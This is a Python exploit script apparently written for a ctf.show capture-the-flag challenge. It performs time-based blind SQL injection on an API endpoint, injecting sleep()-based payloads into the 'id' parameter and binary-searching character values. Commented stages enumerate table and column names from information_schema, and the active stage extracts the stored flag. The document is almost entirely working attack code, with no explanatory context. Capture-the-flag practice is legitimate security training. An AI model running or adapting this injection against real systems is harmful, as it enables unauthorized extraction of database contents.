import requests
import time

url = 'http://ebdf6c67-2f9e-424b-8dc9-17078186b499.challenge.ctf.show/api/delete.php'
str = ''

for i in range(1, 35):

    min,max = 32,128
    
    while True:
        j = min + (max-min)//2
        if(min == j):
            str += chr(j)
            print(str)
            break
            
        # 爆表名
        # payload = {
        #     'id': f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{j},sleep(0.03),1)#'
        # }
        
        # 爆列
        # payload = {
        #     'id': f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{i},1))<{j},sleep(0.03),1)#"
        # }
        
        # 爆值
        payload = {
            'id': f"if(ascii(substr((select group_concat(flag) from flag),{i},1))<{j},sleep(0.03),1)#"
        }
        
        start_time = time.time()
        r = requests.post(url=url, data=payload).text
        end_time = time.time()
        sub = end_time - start_time
        
        if sub >= 0.5:
            max = j
        else:
            min = j